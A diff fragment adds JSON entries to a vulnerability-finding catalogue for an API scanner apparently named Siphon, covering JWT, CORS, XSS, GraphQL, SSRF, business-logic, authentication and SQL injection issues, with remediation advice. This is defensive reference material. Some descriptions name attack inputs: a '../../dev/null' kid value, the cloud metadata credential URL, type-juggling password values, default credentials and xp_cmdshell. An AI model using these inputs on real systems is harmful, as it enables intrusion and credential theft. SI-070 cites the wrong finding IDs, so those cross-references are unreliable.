+      "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html",
+      "https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/",
+      "https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability"
+    ]
+  },
+  {
+    "id": "SI-070",
+    "title": "JWT Uses Insecure Algorithm",
+    "severity": "HIGH",
+    "category": "Authentication \u2014 JWT",
+    "owasp_api": "API2:2023 Broken Authentication",
+    "owasp_web": "A07:2021 Identification and Authentication Failures",
+    "nist": [
+      "IA-5",
+      "SC-8",
+      "SC-28"
+    ],
+    "cves": [
+      "CVE-2015-9235",
+      "CVE-2016-10555"
+    ],
+    "cvss_score": 8.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+    "description": "The API issues or accepts JWTs using an algorithm that provides insufficient security guarantees. This includes weak algorithms such as RS256 with small key sizes, or algorithms deprecated by current IETF guidance. Weak algorithm usage allows an attacker with sufficient compute resources to forge token signatures, enabling authentication bypass and privilege escalation. This finding excludes the 'none' algorithm (SI-077) and RS256-to-HS256 confusion (SI-071) which are covered separately.",
+    "remediation": "Use only NIST-approved and IETF-recommended JWT signing algorithms: RS256 or RS512 (RSA-PKCS1v15), ES256 or ES512 (ECDSA), or PS256 or PS512 (RSA-PSS). Ensure RSA keys are at least 2048 bits. Use an allowlist of permitted algorithms in the JWT validation library and reject tokens signed with any other algorithm. Rotate signing keys annually or when compromise is suspected.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://portswigger.net/web-security/jwt",
+      "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html",
+      "https://nvd.nist.gov/vuln/detail/CVE-2015-9235",
+      "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"
+    ]
+  },
+  {
+    "id": "SI-071",
+    "title": "JWT kid Header Path Traversal",
+    "severity": "HIGH",
+    "category": "Authentication \u2014 JWT",
+    "owasp_api": "API2:2023 Broken Authentication",
+    "owasp_web": "A07:2021 Identification and Authentication Failures",
+    "nist": [
+      "IA-5",
+      "SC-28",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "description": "The JWT kid (key ID) header parameter is used by the server to locate the signing key on the filesystem, and the server does not sanitize path traversal sequences in the kid value. An attacker can craft a JWT with a kid value like '../../dev/null' to cause the server to use an empty or predictable file as the signing key, then forge a valid JWT signature using that key. If the server uses the kid to construct a filesystem path, path traversal can redirect it to an attacker-controlled key file.",
+    "remediation": "Validate the kid header against an allowlist of known key identifiers before using it to locate keys. Never use the kid value directly in filesystem path construction. Store keys in a key management system or in-memory key store rather than on the filesystem. Sanitize all path traversal sequences from kid values before any processing.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal",
+      "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html",
+      "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"
+    ]
+  },
+  {
+    "id": "SI-072",
+    "title": "JWT Token Not Invalidated After Logout",
+    "severity": "HIGH",
+    "category": "Authentication \u2014 JWT",
+    "owasp_api": "API2:2023 Broken Authentication",
+    "owasp_web": "A07:2021 Identification and Authentication Failures",
+    "nist": [
+      "AC-12",
+      "IA-5",
+      "SC-23"
+    ],
+    "cves": [],
+    "cvss_score": 7.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N",
+    "description": "Siphon confirmed that a JWT obtained before calling the logout endpoint remains valid and accepted by the API after the logout call completes. The API relies solely on the JWT's expiry (exp) claim for invalidation and does not maintain a server-side revocation list or blocklist. An attacker who obtains a victim's JWT (via XSS, network interception, log leakage, or device theft) can continue using the token until it naturally expires, even after the victim has logged out and changed their password.",
+    "remediation": "Implement server-side JWT revocation by maintaining a blocklist of invalidated token JTI (JWT ID) values, or by using a short token lifetime combined with a reference token pattern (opaque tokens that can be instantly revoked). Issue all JWTs with a unique jti claim and store active jti values in a cache (Redis) that is checked on each request. Alternatively, use opaque session tokens instead of JWTs when instant revocation is required.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html",
+      "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/",
+      "https://portswigger.net/web-security/jwt"
+    ]
+  },
+  {
+    "id": "SI-073",
+    "title": "CORS \u2014 Reflected Origin with Credentials",
+    "severity": "HIGH",
+    "category": "CORS",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "AC-4",
+      "SC-8"
+    ],
+    "cves": [],
+    "cvss_score": 8.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
+    "description": "The API reflects the incoming request's Origin header directly in the Access-Control-Allow-Origin response header and sets Access-Control-Allow-Credentials: true. This effectively grants every domain in the world credentialed cross-origin access to the API. An attacker-controlled page can make credentialed cross-origin requests to the API and read the response, enabling session hijacking, account data exfiltration, and authenticated actions performed on behalf of the victim without their knowledge.",
+    "remediation": "Implement an explicit allowlist of trusted origins and only reflect the Origin header in CORS responses when the requesting origin is in the allowlist. Never reflect arbitrary origins when Access-Control-Allow-Credentials is true. Validate the allowlist server-side on every cross-origin request. Regularly audit the CORS allowlist to ensure no untrusted domains have been added.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://portswigger.net/web-security/cors",
+      "https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-074",
+    "title": "Reflected Cross-Site Scripting (XSS)",
+    "severity": "HIGH",
+    "category": "Injection",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A03:2021 Injection",
+    "nist": [
+      "SI-10",
+      "SI-15"
+    ],
+    "cves": [],
+    "cvss_score": 7.2,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
+    "description": "Siphon confirmed a reflected Cross-Site Scripting (XSS) vulnerability where user-supplied input from an API parameter is reflected in an HTML response without encoding or sanitization. An attacker can craft a malicious URL containing a script payload and trick a user into clicking it, causing the script to execute in the victim's browser in the context of the application origin. This enables session hijacking, credential theft, keylogging, and arbitrary actions performed as the victim.",
+    "remediation": "Apply context-appropriate output encoding to all user-supplied data reflected in HTML responses. Use a security-focused templating engine that provides automatic escaping. Implement a strict Content-Security-Policy to mitigate XSS exploitation even if encoding is bypassed. Set the HttpOnly flag on session cookies. Validate and sanitize all input server-side before reflecting it in any response.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://portswigger.net/web-security/cross-site-scripting",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-075",
+    "title": "GraphQL Introspection Enabled",
+    "severity": "MEDIUM",
+    "category": "GraphQL Security",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A05:2021 Security Misconfiguration",
+    "nist": [
+      "CM-6",
+      "CM-7"
+    ],
+    "cves": [],
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "description": "The GraphQL API has introspection enabled, allowing unauthenticated or authenticated clients to query the complete API schema including all types, fields, mutations, subscriptions, arguments, and their descriptions. Introspection provides an attacker with a complete blueprint of the API equivalent to reading the source code, significantly lowering the barrier to discovering sensitive operations, hidden mutations, and exploitable fields. In production APIs, introspection should only be available to authenticated developers.",
+    "remediation": "Disable GraphQL introspection in production environments. Most frameworks support a simple configuration flag to disable introspection queries. If introspection must be available to developers, restrict it to authenticated requests from trusted IP addresses or developer accounts. Consider using query complexity analysis and depth limiting in addition to disabling introspection.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html",
+      "https://portswigger.net/web-security/graphql",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-076",
+    "title": "GraphQL Batch Query Attack Possible",
+    "severity": "HIGH",
+    "category": "GraphQL Security",
+    "owasp_api": "API4:2023 Unrestricted Resource Consumption",
+    "owasp_web": null,
+    "nist": [
+      "SC-5",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L",
+    "description": "The GraphQL API accepts batched queries \u2014 multiple operations in a single HTTP request submitted as a JSON array. An attacker can use this to bypass rate limiting by packing thousands of operations into a single request, enumerate sensitive data efficiently, or perform brute-force attacks against authentication mutations within a single connection. Since most rate limiting implementations count HTTP requests rather than GraphQL operations, batching multiplies the effective request rate by the batch size.",
+    "remediation": "Disable query batching if not required by any legitimate client. If batching is needed, implement a maximum batch size limit (e.g., 10 operations per request). Ensure rate limiting counts individual GraphQL operations within batches rather than HTTP requests. Monitor for unusually large batched requests as an indicator of abuse.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html",
+      "https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/"
+    ]
+  },
+  {
+    "id": "SI-077",
+    "title": "GraphQL Query Depth Attack",
+    "severity": "HIGH",
+    "category": "GraphQL Security",
+    "owasp_api": "API4:2023 Unrestricted Resource Consumption",
+    "owasp_web": null,
+    "nist": [
+      "SC-5",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "description": "The GraphQL API accepts deeply nested queries without enforcing a maximum query depth limit. An attacker can submit a deeply recursive query that causes the resolver chain to execute exponentially more database queries or CPU work than a shallow query. For example, a query asking for user's friends' friends' friends' posts' comments' authors (10+ levels deep) can result in N^10 database queries. This is a reliable denial-of-service vector available to any client with API access.",
+    "remediation": "Implement a maximum query depth limit in the GraphQL execution engine (recommended: 10-15 levels maximum depending on schema). Use a query complexity analysis library to assign cost scores to fields and reject queries exceeding the complexity budget. Apply query timeout limits as an additional safeguard. Use query cost analysis to account for relationship traversal cost.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html",
+      "https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/"
+    ]
+  },
+  {
+    "id": "SI-078",
+    "title": "SOAP Injection \u2014 Parameter Reflected or Error Triggered",
+    "severity": "HIGH",
+    "category": "Injection",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A03:2021 Injection",
+    "nist": [
+      "SI-10",
+      "SI-15"
+    ],
+    "cves": [],
+    "cvss_score": 7.2,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
+    "description": "Siphon detected that SOAP API parameters reflect injected XML content in the response or trigger parser errors indicative of XML injection. SOAP injection allows an attacker to inject additional XML elements, close existing tags, or inject new SOAP body elements. Successful SOAP injection can bypass authentication, modify business logic, extract data from the SOAP response, or trigger XML processing vulnerabilities (XXE) depending on the XML parser configuration.",
+    "remediation": "Validate and sanitize all SOAP parameter values before XML processing. Encode special XML characters (<, >, &, ', \") in user-supplied values. Use parameterized SOAP processing rather than string concatenation to construct SOAP messages. Disable external entity processing (XXE) in the XML parser. Validate incoming SOAP messages against a strict XSD schema.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection",
+      "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
+      "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"
+    ]
+  },
+  {
+    "id": "SI-079",
+    "title": "SSRF via API Parameter",
+    "severity": "HIGH",
+    "category": "SSRF",
+    "owasp_api": "API7:2023 Server Side Request Forgery",
+    "owasp_web": "A10:2021 Server-Side Request Forgery",
+    "nist": [
+      "AC-4",
+      "SC-7",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 8.6,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
+    "description": "Siphon confirmed a Server-Side Request Forgery (SSRF) vulnerability where a URL supplied in an API parameter causes the server to make an HTTP request to the specified URL. An attacker can exploit this to reach internal services not accessible from the internet, probe internal network topology, access cloud instance metadata endpoints (e.g., http://169.254.169.254/latest/meta-data/ for AWS credentials), access localhost services, or potentially achieve remote code execution via SSRF chains.",
+    "remediation": "Implement server-side URL validation against a strict allowlist of permitted schemes and destination hostnames before making any outbound request. Block requests to private IP ranges, loopback addresses, link-local addresses (169.254.x.x), and cloud metadata endpoints. Use a DNS resolution step to resolve the hostname and verify the resulting IP is not in a blocked range. Implement outbound firewall rules to prevent the application server from reaching internal services. Log all outbound HTTP requests.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://portswigger.net/web-security/ssrf",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
+      "https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/"
+    ]
+  },
+  {
+    "id": "SI-080",
+    "title": "Business Flow \u2014 Workflow Step Directly Accessible",
+    "severity": "HIGH",
+    "category": "Business Logic",
+    "owasp_api": "API6:2023 Unrestricted Access to Sensitive Business Flows",
+    "owasp_web": "A04:2021 Insecure Design",
+    "nist": [
+      "AC-3",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+    "description": "Siphon confirmed that a step in a multi-stage business workflow (e.g., checkout confirmation, order completion, password reset confirmation, OTP verification success) can be accessed directly without completing the preceding steps. The API does not enforce workflow state on the server side, relying instead on the client to follow the correct sequence. An attacker can skip prerequisite steps such as payment verification or identity verification by directly calling the completion endpoint.",
+    "remediation": "Implement server-side workflow state management that tracks the current state of each session's progress through multi-step processes. Require prerequisite steps to be completed and validated before allowing access to subsequent steps. Use server-side session tokens to track workflow state rather than trusting client-supplied step indicators. Implement transaction-level validation that verifies all prerequisite conditions are met before committing the final step.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/",
+      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/10-Business_Logic_Testing/06-Testing_for_the_Circumvention_of_Work_Flows"
+    ]
+  },
+  {
+    "id": "SI-081",
+    "title": "Business Flow \u2014 Race Condition (Duplicate Operation)",
+    "severity": "HIGH",
+    "category": "Business Logic",
+    "owasp_api": "API6:2023 Unrestricted Access to Sensitive Business Flows",
+    "owasp_web": "A04:2021 Insecure Design",
+    "nist": [
+      "AC-3",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 7.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N",
+    "description": "Siphon confirmed a race condition vulnerability where submitting the same API operation multiple times in parallel results in the operation being executed more than once. Examples include: a referral bonus being credited multiple times, a one-time discount being applied to multiple orders, a withdrawal exceeding the account balance when concurrent requests are processed, or a promotional code being redeemed multiple times. The application checks the constraint and performs the action in separate non-atomic operations, creating a TOCTOU (Time-of-Check to Time-of-Use) window.",
+    "remediation": "Implement atomic database operations or database-level constraints (unique indexes, SELECT FOR UPDATE, serializable transactions) to prevent duplicate execution. Use distributed locks (Redis, database advisory locks) for operations that must not be executed concurrently for the same resource. Implement idempotency keys for all state-changing API operations. Add application-level duplicate detection based on request signatures or operation IDs.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://portswigger.net/web-security/race-conditions",
+      "https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Transaction_Authorization_Cheat_Sheet.html"
+    ]
+  },
+  {
+    "id": "SI-082",
+    "title": "Business Flow \u2014 Bulk Endpoint Accepts Unrestricted Batch Size",
+    "severity": "HIGH",
+    "category": "Business Logic",
+    "owasp_api": "API4:2023 Unrestricted Resource Consumption",
+    "owasp_web": null,
+    "nist": [
+      "SC-5",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+    "description": "The API exposes a bulk operation endpoint that accepts an array of items without enforcing a maximum batch size limit. An attacker can submit a single request with tens of thousands of items, causing the server to perform excessive database operations, computation, or outbound calls proportional to the batch size. This can be used for targeted denial-of-service, resource exhaustion attacks, or mass data manipulation in a single authenticated request.",
+    "remediation": "Implement a maximum batch size limit on all bulk endpoints (e.g., 100-1000 items per request depending on operation cost). Return 400 Bad Request or 413 Payload Too Large when the limit is exceeded. Implement asynchronous processing for large batches with job-based status tracking rather than synchronous processing. Apply rate limiting at the operation level, not just the HTTP request level.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html"
+    ]
+  },
+  {
+    "id": "SI-083",
+    "title": "Missing Authentication Enforcement",
+    "severity": "CRITICAL",
+    "category": "Authentication",
+    "owasp_api": "API2:2023 Broken Authentication",
+    "owasp_web": "A07:2021 Identification and Authentication Failures",
+    "nist": [
+      "IA-2",
+      "IA-3",
+      "AC-3"
+    ],
+    "cves": [],
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "description": "Siphon confirmed that an API endpoint that should require authentication is accessible without any credentials. The endpoint performs a sensitive operation or returns sensitive data in response to completely unauthenticated requests. This represents a complete authentication bypass where no credentials of any kind are required. An anonymous attacker on the internet can directly invoke the endpoint and access its full functionality without any account or credential.",
+    "remediation": "Implement authentication enforcement as a mandatory middleware applied to all non-public API endpoints. Adopt a secure-by-default policy where all new endpoints require authentication unless explicitly marked as public. Conduct a full audit of all API endpoints to verify authentication is enforced. Remove any whitelisted paths from authentication bypass rules that are not genuinely intended to be public.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+    ]
+  },
+  {
+    "id": "SI-084",
+    "title": "BFLA \u2014 Admin Endpoint Accessible",
+    "severity": "CRITICAL",
+    "category": "Broken Function Level Authorization",
+    "owasp_api": "API5:2023 Broken Function Level Authorization",
+    "owasp_web": "A01:2021 Broken Access Control",
+    "nist": [
+      "AC-3",
+      "AC-6"
+    ],
+    "cves": [],
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "description": "Siphon confirmed that an administrative API endpoint is accessible by a non-administrative user or by an unauthenticated attacker. Administrative endpoints typically provide user management (create/delete accounts, change roles), system configuration, data export, secret rotation, or other privileged operations. Access to an admin endpoint without proper authorization can result in complete account takeover of all users, data exfiltration, or full application compromise.",
+    "remediation": "Immediately restrict access to all administrative endpoints. Require administrator role authentication for all admin API paths. Implement role-based access control with explicit allow-lists per endpoint. Deploy admin API endpoints on a separate internal hostname or network segment not accessible from the public internet. Audit all admin operations with immutable audit logging.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/",
+      "https://portswigger.net/web-security/access-control",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html"
+    ]
+  },
+  {
+    "id": "SI-085",
+    "title": "BOLA \u2014 Broken Object Level Authorization",
+    "severity": "CRITICAL",
+    "category": "Broken Object Level Authorization",
+    "owasp_api": "API1:2023 Broken Object Level Authorization",
+    "owasp_web": "A01:2021 Broken Access Control",
+    "nist": [
+      "AC-3",
+      "AC-4"
+    ],
+    "cves": [],
+    "cvss_score": 9.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+    "description": "Siphon confirmed a Broken Object Level Authorization (BOLA) vulnerability, also known as IDOR (Insecure Direct Object Reference). An authenticated user can access or modify resources owned by other users by substituting a different object identifier in the API request. The server returns data for the requested object without verifying that the authenticated user is the owner or has been explicitly granted access to that specific object. This is the most prevalent API vulnerability category and can expose all user data in the system.",
+    "remediation": "Implement object-level authorization checks on every endpoint that accesses a specific resource. Verify that the authenticated user ID matches the resource owner or has been explicitly granted access before returning or modifying any data. Derive the target user context from the authenticated session, not from client-supplied parameters. Implement automated authorization tests for every user-scoped API endpoint as part of the CI/CD pipeline.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/",
+      "https://portswigger.net/web-security/access-control/idor",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html"
+    ]
+  },
+  {
+    "id": "SI-086",
+    "title": "Default Credentials Accepted on API Login Endpoint",
+    "severity": "CRITICAL",
+    "category": "Authentication",
+    "owasp_api": "API2:2023 Broken Authentication",
+    "owasp_web": "A07:2021 Identification and Authentication Failures",
+    "nist": [
+      "IA-5",
+      "CM-6"
+    ],
+    "cves": [],
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "description": "The API login endpoint accepts default credentials (e.g., admin/admin, admin/password, admin/1234, root/root, test/test, or vendor-specific defaults) and returns a successful authentication response. Default credentials are publicly known and represent the first credential set attempted by automated attackers. Successful login with default credentials provides immediate administrative or user access without any exploitation complexity, effectively bypassing all other security controls.",
+    "remediation": "Immediately change all default credentials on all accounts. Force password change on first login for all accounts provisioned with default credentials. Implement a credential policy that prevents setting passwords matching known-default or commonly-used values. Audit all accounts and API keys for default or trivially-guessable credentials. Disable any service accounts with default credentials that are not currently in use.",
+    "metasploit": [
+      "auxiliary/scanner/http/default_credentials"
+    ],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html",
+      "https://cwe.mitre.org/data/definitions/1392.html"
+    ]
+  },
+  {
+    "id": "SI-087",
+    "title": "Type Juggling / JSON Type Confusion Authentication Bypass",
+    "severity": "CRITICAL",
+    "category": "Authentication",
+    "owasp_api": "API2:2023 Broken Authentication",
+    "owasp_web": "A07:2021 Identification and Authentication Failures",
+    "nist": [
+      "IA-2",
+      "IA-5",
+      "SI-10"
+    ],
+    "cves": [],
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "description": "Siphon confirmed an authentication bypass via JSON type confusion (type juggling). By submitting a non-string value in the JSON body for the password field (e.g., true (boolean), 0 (integer), null, or []) the authentication logic is bypassed. This occurs in dynamically-typed languages (PHP, JavaScript, Python) where loose comparison operators (==, in PHP: true == 'any string') evaluate to true when comparing certain type mismatches. An attacker can log in as any known username without knowing the password.",
+    "remediation": "Use strict type-safe comparison operators in all authentication logic. In PHP, use === instead of ==. In JavaScript/Node.js, validate that the incoming password is of type string before any comparison. Validate request body field types against expected types in the API schema before processing. Reject any authentication request where credentials are not of the expected primitive type.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/",
+      "https://portswigger.net/web-security/authentication",
+      "https://cwe.mitre.org/data/definitions/843.html"
+    ]
+  },
+  {
+    "id": "SI-088",
+    "title": "JWT None Algorithm Accepted",
+    "severity": "CRITICAL",
+    "category": "Authentication \u2014 JWT",
+    "owasp_api": "API2:2023 Broken Authentication",
+    "owasp_web": "A07:2021 Identification and Authentication Failures",
+    "nist": [
+      "IA-5",
+      "SC-8"
+    ],
+    "cves": [
+      "CVE-2015-9235"
+    ],
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "description": "Siphon confirmed that the API accepts JWTs signed with the 'none' algorithm (alg: none, alg: None, alg: NONE). The 'none' algorithm specifies that no signature is required, meaning an attacker can craft an arbitrary JWT with any claims (any user ID, any role, any expiry) without needing the server's signing key. By setting alg to 'none' and removing the signature, an attacker achieves complete authentication bypass and can impersonate any user including administrators.",
+    "remediation": "Implement an explicit algorithm allowlist in the JWT verification configuration and reject all tokens using the 'none' algorithm. Never rely on the algorithm specified in the JWT header to determine how to verify the token \u2014 use a server-side configured algorithm. Upgrade JWT libraries to versions that do not accept the 'none' algorithm by default. Audit all JWT validation code paths for algorithm confusion vulnerabilities.",
+    "metasploit": [],
+    "exploitdb": [],
+    "references": [
+      "https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature",
+      "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
+      "https://nvd.nist.gov/vuln/detail/CVE-2015-9235",
+      "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"
+    ]
+  },
+  {
+    "id": "SI-089",
+    "title": "SQL Injection in API Parameter",
+    "severity": "CRITICAL",
+    "category": "Injection",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A03:2021 Injection",
+    "nist": [
+      "SI-10",
+      "SI-15"
+    ],
+    "cves": [],
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "description": "Siphon confirmed a SQL injection vulnerability in an API parameter. User-supplied input is incorporated into a SQL query without parameterization or adequate sanitization. An attacker can inject SQL syntax to extract all data from the database, bypass authentication, modify or delete database records, read server files (via LOAD_FILE or xp_cmdshell), execute OS commands (via xp_cmdshell or UDF), or achieve complete database server compromise. SQL injection in APIs is particularly severe because the API may provide direct database access without application-layer filtering.",
+    "remediation": "Replace all dynamic SQL query construction with parameterized queries or prepared statements. Use an ORM that automatically parameterizes queries. If dynamic queries are unavoidable, use an allowlist-based escaping function appropriate for the database platform. Apply the principle of least privilege to database accounts: the API's DB user should not have DROP, TRUNCATE, or file access permissions. Implement a WAF rule for SQL injection patterns as defense-in-depth.",
+    "metasploit": [
+      "auxiliary/scanner/http/sqli_scanner"
+    ],
+    "exploitdb": [],
+    "references": [
+      "https://portswigger.net/web-security/sql-injection",
+      "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
+      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Penetration_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection"
+    ]
+  },
+  {
+    "id": "SI-090",
+    "title": "Blind SQL Injection (Boolean-Based)",
+    "severity": "CRITICAL",
+    "category": "Injection",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A03:2021 Injection",
+    "nist": [
+      "SI-10",
+      "SI-15"
+    ],
+    "cves": [],
+    "cvss_score": 9.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "description": "Siphon confirmed a boolean-based blind SQL injection vulnerability where injecting boolean conditions into an API parameter produces different application responses (different response body, length, or status code) depending on whether the injected condition is true or false. While no data is returned directly, an attacker can exfiltrate the entire database content bit-by-bit by asking true/false questions about the data (e.g., 'is the first character of the admin password greater than M?'). Automated tools like sqlmap can extract the complete database in minutes.",
+    "remediation": "Replace all dynamic SQL construction with parameterized queries. The remediation is identical to direct SQL injection (SI-089). Blind injection is often harder to detect through manual code review, making comprehensive use of parameterized queries and ORM frameworks critical. Run automated SQL injection scans (sqlmap) against all API endpoints as part of security testing.",
+    "metasploit": [
+      "auxiliary/scanner/http/sqli_scanner"
+    ],
+    "exploitdb": [],
+    "references": [
+      "https://portswigger.net/web-security/sql-injection/blind",
+      "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
+      "https://github.com/sqlmapproject/sqlmap"
+    ]
+  },
+  {
+    "id": "SI-091",
+    "title": "Blind SQL Injection (Time-Based)",
+    "severity": "CRITICAL",
+    "category": "Injection",
+    "owasp_api": "API8:2023 Security Misconfiguration",
+    "owasp_web": "A03:2021 Injection",
+    "nist": [
+      "SI-10",
+      "SI-15"
+    ],
+    "cves": [],
